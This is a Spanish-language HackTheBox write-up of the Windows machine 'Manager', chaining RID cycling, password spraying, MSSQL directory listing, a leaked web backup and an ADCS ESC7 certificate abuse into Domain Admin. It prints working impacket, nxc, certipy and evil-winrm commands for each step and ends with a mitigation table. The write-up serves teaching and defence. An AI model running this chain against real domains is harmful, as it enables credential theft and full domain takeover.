@@ -1,0 +1,194 @@
+---
+title: "Manager"
+platform: "HackTheBox"
+os: "Windows"
+difficulty: "Medium"
+date: 2026-10-19
+ports: ["53/dns", "80/http", "88/kerberos", "389/ldap", "445/smb", "636/ldaps", "1433/mssql", "3268/gc", "5985/winrm", "9389/adws"]
+tags: ["active-directory", "adcs", "esc7", "mssql", "certipy", "rid-brute", "password-spray", "pass-the-hash"]
+summary: "DC de Active Directory comprometido de punta a punta: enumeración anónima vía RID cycling, password spraying para un foothold en MSSQL, un backup de la web olvidado con credenciales LDAP, y escalada a Domain Admin abusando de permisos sobre la CA de ADCS (ESC7)."
+---
+
+import Esc7Chain from "../../components/writeup/Esc7Chain.astro";
+
+## Resumen
+
+Manager es una máquina Windows que modela un Domain Controller con una PKI de Active Directory mal configurada. La cadena completa fue:
+
+1. **Enumeración anónima** del dominio mediante RID cycling para obtener una lista de usuarios válidos.
+2. **Password spraying** (usuario = nombre en minúsculas) que reveló las credenciales `Operator:operator`.
+3. Con ese usuario, acceso de solo lectura a **MSSQL**, usado como canal lateral para **listar el filesystem** (`xp_dirtree`) y descubrir un **backup de la web** olvidado en la raíz de IIS.
+4. El backup contenía un fichero de configuración LDAP con las credenciales en claro de **Raven**.
+5. Raven tenía el permiso **`ManageCa`** sobre la Autoridad Certificadora → escalada a Administrator vía **ADCS ESC7**.
+
+<Callout type="note">
+El patrón central de la máquina: un canal que da **lectura/listado** pero no ejecución (MSSQL como `guest`) sigue siendo explotable — se usa para *descubrir* y el botín se recoge por el canal más cómodo (HTTP).
+</Callout>
+
+## Reconocimiento
+
+El escaneo de puertos dibuja un Domain Controller de manual: DNS (53), Kerberos (88), LDAP (389/636), SMB (445), Global Catalog (3268/3269) y ADWS (9389). Además, tres vectores jugosos: IIS (80), MSSQL 2019 (1433) y WinRM (5985).
+
+```bash
+nmap -p- --min-rate 5000 -sS <IP>
+nmap -p53,80,88,135,139,389,445,593,636,1433,3268,3269,5985,9389 -sCV <IP>
+```
+
+Datos clave del escaneo de servicios:
+
+- **Dominio:** `manager.htb` — **FQDN del DC:** `dc01.manager.htb`
+- **SO:** Windows Server 2019 (build 17763)
+- **MSSQL 2019 RTM** sin parches en 1433
+- Web **IIS 10.0** con título "Manager" en 80
+
+```bash
+echo "<IP> manager.htb dc01.manager.htb dc01" | sudo tee -a /etc/hosts
+```
+
+### Enumeración de usuarios (RID cycling)
+
+El RID brute por SMB/LSA devolvió `STATUS_ACCESS_DENIED`, pero la máquina acepta autenticación con cualquier usuario y contraseña vacía (null session tipo guest). `impacket-lookupsid` hace el RID cycling por un canal distinto y sí funciona:
+
+```bash
+impacket-lookupsid 'manager.htb/guest@dc01.manager.htb' -no-pass
+```
+
+Usuarios reales obtenidos (RIDs 1113+): `Zhong`, `Cheng`, `Ryan`, `Raven`, `JinWoo`, `ChinHae`, `Operator`.
+
+<Callout type="tip">
+Si el RID brute por SMB da `ACCESS_DENIED`, no te rindas: `impacket-lookupsid` ataca el cycling vía MS-LSAT/SAMR por otro binding y a menudo responde cuando el canal LSA está capado.
+</Callout>
+
+## Foothold
+
+### Password spraying
+
+AS-REP roasting no dio nada (ningún usuario con preauth desactivado) y el spray `usuario=Usuario` falló. Pero probando el nombre **en minúsculas** cayó un acierto:
+
+```bash
+tr '[:upper:]' '[:lower:]' < users.txt > users_lower.txt
+nxc smb dc01.manager.htb -u users.txt -p users_lower.txt --no-bruteforce --continue-on-success
+# [+] manager.htb\Operator:operator
+```
+
+### MSSQL como canal de descubrimiento
+
+`Operator` puede autenticarse en MSSQL, pero solo como `guest` (sin sysadmin), así que `xp_cmdshell` queda descartado. Sin embargo, sí puede **listar el disco** con `xp_dirtree`:
+
+```bash
+impacket-mssqlclient manager.htb/Operator:operator@dc01.manager.htb -windows-auth
+```
+
+```sql
+EXEC xp_dirtree 'C:\inetpub\wwwroot\', 1, 1;
+```
+
+El listado reveló un fichero que no pinta nada en una web pública:
+
+```text
+website-backup-27-07-23-old.zip
+```
+
+Al estar en `C:\inetpub\wwwroot\` (la raíz que IIS sirve), se descarga directamente por HTTP:
+
+```bash
+wget http://manager.htb/website-backup-27-07-23-old.zip
+unzip website-backup-27-07-23-old.zip -d backup
+```
+
+Dentro, un fichero oculto `.old-conf.xml` con credenciales LDAP en claro:
+
+```xml
+<user>raven@manager.htb</user>
+<password>********************</password>
+```
+
+<Callout type="warning">
+Los backups de web guardan secretos que la web viva ya no expone. Siempre revisa ficheros ocultos (`ls -la`) y haz grep de `password|pwd|connectionstring` sobre todo el contenido descomprimido.
+</Callout>
+
+Las credenciales de Raven validan contra WinRM → shell y **user flag**:
+
+```bash
+evil-winrm -i dc01.manager.htb -u raven -p '<password>'
+```
+
+## Escalada de privilegios
+
+### Diagnóstico: ADCS
+
+`whoami /all` sobre Raven muestra la pertenencia a `BUILTIN\Certificate Service DCOM Access` → hay una CA en el dominio y Raven interactúa con ella. `certipy find` no marcó templates vulnerables, así que el fallo está en la **CA misma**: leyendo la sección `CA Permissions` en crudo aparece
+
+```text
+ManageCa : ... MANAGER.HTB\Raven
+```
+
+Esto es **ESC7**: un principal con permisos administrativos sobre la Autoridad Certificadora.
+
+<Callout type="tip">
+No te fíes solo del flag `-vulnerable` de Certipy. ESC7 depende de ACLs sobre la CA que el filtro automático a veces no rotula — hay que leer siempre la sección `CA Permissions` a mano.
+</Callout>
+
+### La cadena ESC7
+
+Raven tiene `ManageCa` pero no `ManageCertificates`. Cada paso habilita el siguiente, hasta convertir un permiso sobre la CA en el hash del Administrator:
+
+<Esc7Chain />
+
+Los comandos de la cadena, en orden:
+
+```bash
+# 1. ManageCa permite nombrar officers → me auto-concedo ManageCertificates
+certipy-ad ca -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -add-officer raven
+
+# 2. Habilitar la plantilla SubCA (permite SAN arbitrario)
+certipy-ad ca -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -enable-template SubCA
+
+# 3. Pedir cert como administrator → queda PENDING (TEMPLATE_DENIED). Apuntar Request ID
+certipy-ad req -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -target dc01.manager.htb \
+  -template SubCA -upn administrator@manager.htb
+
+# 4. Aprobar la petición pendiente (ya soy officer)
+certipy-ad ca -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -issue-request <ID>
+
+# 5. Recoger el certificado emitido → administrator.pfx
+certipy-ad req -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -target dc01.manager.htb -retrieve <ID>
+```
+
+<Callout type="warning">
+El orden no es negociable: `add-officer` **debe** ir antes de `issue-request`, o la aprobación falla con `Access denied: Insufficient permissions to issue certificate`. Cada paso habilita el siguiente.
+</Callout>
+
+### Pass-the-Hash final
+
+El `.pfx` con UPN `administrator@manager.htb` **es** la identidad del admin. Vía PKINIT se obtiene su TGT y, con UnPAC-the-hash, su hash NT:
+
+```bash
+sudo ntpdate dc01.manager.htb          # PKINIT es Kerberos puro: el clock skew lo rompe
+certipy-ad auth -pfx administrator.pfx -dc-ip <IP>
+# [*] Got hash for 'administrator@manager.htb': aad3b435...:<NT_HASH>
+
+evil-winrm -i dc01.manager.htb -u administrator -H <NT_HASH>
+```
+
+Shell como Administrator → **root flag**. Máquina comprometida.
+
+<Callout type="note">
+En AD con PKINIT, un certificado sustituye a la contraseña como prueba de identidad. "Poder pedir un certificado" se convierte en "poder ser cualquiera" — por eso una PKI mal configurada es tan letal.
+</Callout>
+
+## Lecciones y mitigaciones
+
+| Fallo | Impacto | Mitigación |
+|-------|---------|------------|
+| RID cycling anónimo habilitado | Enumeración completa de usuarios del dominio | Restringir null sessions; endurecer `RestrictAnonymous` |
+| Contraseñas triviales (usuario = nombre) | Foothold por password spraying | Política de contraseñas robusta; detección de spraying |
+| Backup con credenciales en la raíz web | Credenciales de Raven en claro | No dejar backups en directorios servidos; rotar secretos filtrados |
+| Credenciales en claro en config LDAP | Reutilización directa | Cuentas de servicio con secretos gestionados (gMSA / vault) |
+| `ManageCa` sobre la CA a un usuario de bajo privilegio (ESC7) | Escalada directa a Domain Admin | Revisar ACLs de la CA; limitar officers; deshabilitar plantillas sin usar |
+| Certificados sin binding fuerte de SID | Suplantación vía UPN | Aplicar KB5014754 (strong certificate mapping) |
